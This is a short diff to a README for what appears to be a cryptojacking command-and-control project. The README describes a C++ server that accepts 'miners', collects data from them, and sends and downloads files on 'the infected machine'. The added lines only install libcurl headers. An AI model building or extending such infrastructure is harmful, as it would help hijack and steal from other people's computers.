@@ -63,3 +63,8 @@ Multithreaded c++ server from scratch, will accept new miners. get info from min
 Also will be capable of sending files and downloading files from the infected machine. 
 
 Every new miner will have an directory, containing info about the mining time, logs, Keys used to secure communication(cryptography), etc.
+
+
+# C++ curl
+
+    sudo apt-get install libcurl4-openssl-dev
